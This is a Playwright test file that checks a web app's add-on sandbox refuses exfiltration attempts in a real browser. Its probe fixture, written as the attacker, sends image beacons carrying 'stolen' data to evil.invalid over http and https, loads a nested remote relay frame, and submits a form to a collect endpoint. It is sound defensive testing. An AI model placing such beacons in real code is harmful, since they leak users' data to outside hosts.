import { test, expect, type Page } from './support/test';
import { addOnFrame } from './support/addon';

/**
 * What the add-on sandbox actually refuses, in a real browser (MICA-196).
 *
 * Everything else about the sandbox is unit-tested against the host server directly, which
 * is the right level for a message protocol. Three of its defences cannot be reached that
 * way at all, because they are enforced by the *browser* rather than by any code in this
 * repo, and jsdom implements none of them:
 *
 *   - Content-Security-Policy. `srcdoc.test.ts` asserts the policy **text**; nothing in the
 *     unit suite asserts that a browser reads it the way the text intends, and a directive
 *     with a typo in it is silently ignored rather than reported.
 *   - CSP inheritance into a nested frame, which is the reason `frame-src 'none'` exists:
 *     a policy inherits only for local schemes, so an `<iframe src="https://…">` inside the
 *     guest would run with no policy at all.
 *   - The number of documents an `<iframe srcdoc>` loads. `AddOnFrame` stops the add-on on
 *     the second, and jsdom's own count is not a browser's — jsdom fires `load` for an
 *     initial `about:blank` it then never navigates away from, so `AddOnFrame.test.ts`
 *     deliberately pins the *rule* and leaves the sequence to this file.
 *
 * The fixtures are registered through `window.appRegistryStore`, like
 * `error_boundary.spec.ts`'s crashing app: an add-on that attacks its own host has no
 * business sitting in `apps/` where it would ship to players. `registerAddOn` takes bundle
 * *text*, which is exactly what an add-on is to the shell, so these run through the real
 * transport rather than a parallel one.
 *
 * **What the fourth refusal proves.** `img-src` was `https: data: blob:` until MICA-202,
 * so an `<img>` beacon to an arbitrary *https* host was permitted and this file said so.
 * It is now `data: blob:` plus the declared `networkHosts`, and the probe's https beacon
 * is refused alongside the plaintext one. The `data:` image that loads beside them is the
 * control: a policy that refused everything would pass every refusal assertion here while
 * meaning no add-on could draw a picture at all.
 */

/** A fixture add-on's manifest, as `defineApp` needs it. */
const manifestFor = (id: string, name: string) =>
  JSON.stringify({ id, name, color: 'bg-red-500', icon: null, core: false });

/**
 * The probe's bundle.
 *
 * It reports through its own DOM rather than `postMessage`, because `postMessage` is the
 * channel under test: a frame that has been shut down cannot talk, so a result that
 * arrived over the wire would be reporting on a boundary it had already crossed. The
 * `securitypolicyviolation` event is what makes each refusal legible — an `<img>` that
 * merely fails to load and one the policy refused are the same `error` event otherwise.
 */
const PROBE_BUNDLE = `
  const seen = new Set();
  const out = document.createElement('pre');
  out.id = 'violations';
  document.getElementById('app').appendChild(out);
  const render = () => { out.textContent = [...seen].sort().join(' '); };
  render();

  document.addEventListener('securitypolicyviolation', (e) => {
    const directive = e.effectiveDirective || e.violatedDirective;
    seen.add(directive);
    // The directive alone cannot tell the two image beacons apart, so record the origin
    // the browser refused as well. blockedURI is stripped for reporting — to the origin
    // for a cross-origin resource, which every resource is from an opaque-origin frame.
    if (e.blockedURI) seen.add(directive + '=' + e.blockedURI);
    render();
  });

  // 1. A pixel beacon. Under an unset img-src this loads and takes the query string with it.
  const beacon = new Image();
  beacon.src = 'http://evil.invalid/beacon?stolen=1';

  // 1b. The same beacon over https (MICA-202). Under img-src https: this one loaded —
  //     the plaintext refusal above proved nothing about it — and networkHosts was never
  //     consulted. The probe declares no hosts, so nothing but data: and blob: may draw.
  const httpsBeacon = new Image();
  httpsBeacon.src = 'https://evil.invalid/beacon?stolen=1';

  // 1c. The control: a data: image, which cannot leave the frame and must still render.
  const inline = new Image();
  inline.addEventListener('load', () => { seen.add('data-image-loaded'); render(); });
  inline.addEventListener('error', () => { seen.add('data-image-refused'); render(); });
  inline.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

  // 2. A nested remote frame. CSP inherits only for local schemes, so before frame-src this
  //    child ran with no policy at all: unrestricted fetch, and a postMessage relay out
  //    through its parent.
  const nested = document.createElement('iframe');
  nested.src = 'https://evil.invalid/relay.html';
  document.body.appendChild(nested);

  // 3. A form POST. A navigation, which connect-src does not govern — and which the
  //    sandbox attribute refuses before CSP is ever consulted, so this raises no violation
  //    event to observe. Attempted anyway: what it proves is that the frame survives it,
  //    rather than navigating and being torn down as the navigator below is.
  const form = document.createElement('form');
  form.method = 'post';
  form.action = 'https://evil.invalid/collect';
  document.body.appendChild(form);
  try { form.submit(); } catch (e) { seen.add('form-blocked-by-sandbox'); render(); }
`;

/**
 * The navigator's bundle: it leaves.
 *
 * No CSP directive stops this. `navigate-to` is the one that would and Chromium has never
 * shipped it, so the host counts documents instead. The target is the phone's own origin
 * because it is certain to load — where it goes does not matter, only that the frame is no
 * longer running the add-on when it gets there.
 *
 * After `load`, not during it. Navigating while the srcdoc document is still parsing
 * *replaces* that load rather than following it, so the frame ends up having loaded exactly
 * one document and the count is honestly 1 — which is a real property of the browser, and
 * one worth knowing: an add-on cannot dodge the rule by leaving early, because leaving
 * early means the shell never hydrated it and it never had a channel in the first place.
 */
const NAVIGATOR_BUNDLE = `
  document.getElementById('app').textContent = 'about to leave';
  addEventListener('load', () => { setTimeout(() => { location.href = '/'; }, 0); });
`;

const registerAddOn = (page: Page, id: string, name: string, bundle: string) =>
  page.evaluate(
    ([manifest, source]) => {
      window.appRegistryStore.registerAddOn(JSON.parse(manifest), source);
    },
    [manifestFor(id, name), bundle] as const
  );

test.describe('the add-on sandbox', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
    await expect(page.locator('h1', { hasText: 'gPhone' })).toBeVisible();
  });

  test('refuses an image beacon over http and https and a nested remote frame, and survives all three', async ({
    page
  }) => {
    await registerAddOn(page, 'sandbox_probe', 'Sandbox Probe', PROBE_BUNDLE);
    await page.getByRole('button', { name: 'Sandbox Probe' }).click();

    const violations = addOnFrame(page, 'sandbox_probe').locator('#violations');
    // One assertion per directive rather than one on the whole string: a policy that
    // happened to refuse everything under `default-src` would pass a substring check while
    // meaning something quite different from the directives that are written.
    await expect(violations).toContainText('img-src');
    // The https beacon specifically (MICA-202): the plaintext one was refused before this
    // ticket too, so `img-src` alone would pass under the old `https:` policy.
    await expect(violations).toContainText('img-src=https://evil.invalid');
    await expect(violations).toContainText('frame-src');
    // And a data: image still draws, so the refusal is a scoping and not a blackout.
    await expect(violations).toContainText('data-image-loaded');
    await expect(violations).not.toContainText('data-image-refused');

    /**
     * `form-action` is deliberately not asserted, and finding out why was worth the trip.
     * `sandbox="allow-scripts"` carries no `allow-forms`, so the browser refuses the
     * submission before CSP is consulted and raises no violation event at all. The
     * directive stays in the policy — it costs nothing and would be the thing that mattered
     * if the sandbox flags ever changed — but there is nothing here to observe.
     */
    await expect(violations).not.toContainText('form-action');

    // And the add-on is still running: refusing a subresource is not the same event as
    // stopping the app, and the frame it is refused in has to survive all three attempts.
    await expect(page.getByText('App Stopped Working')).toBeHidden();
  });

  test('stops an add-on that navigates its frame away from its own bundle', async ({ page }) => {
    await registerAddOn(page, 'sandbox_navigator', 'Sandbox Navigator', NAVIGATOR_BUNDLE);
    await page.getByRole('button', { name: 'Sandbox Navigator' }).click();

    // The crash screen, because to a player this is the same event as any other way an app
    // stops working — and the frame is gone, so a remote page cannot go on being displayed
    // inside the phone's chrome with the add-on's name on it.
    await expect(page.getByText('App Stopped Working')).toBeVisible();
    await expect(page.locator('iframe[data-app="sandbox_navigator"]')).toHaveCount(0);
  });

  /**
   * The pair that makes the test above mean something.
   *
   * If a browser fired `load` twice for an `<iframe srcdoc>` — once for the initial
   * `about:blank` and once for the srcdoc document — the navigator would "pass" while every
   * add-on on the phone was being torn down on sight. This is the control: an add-on that
   * loads one document and stays put must still be running.
   */
  test('leaves an add-on that loads exactly one document alone', async ({ page }) => {
    await registerAddOn(page, 'sandbox_settled', 'Sandbox Settled', PROBE_BUNDLE);
    await page.getByRole('button', { name: 'Sandbox Settled' }).click();

    await expect(addOnFrame(page, 'sandbox_settled').locator('#violations')).toBeVisible();
    await expect(page.getByText('App Stopped Working')).toBeHidden();
  });
});
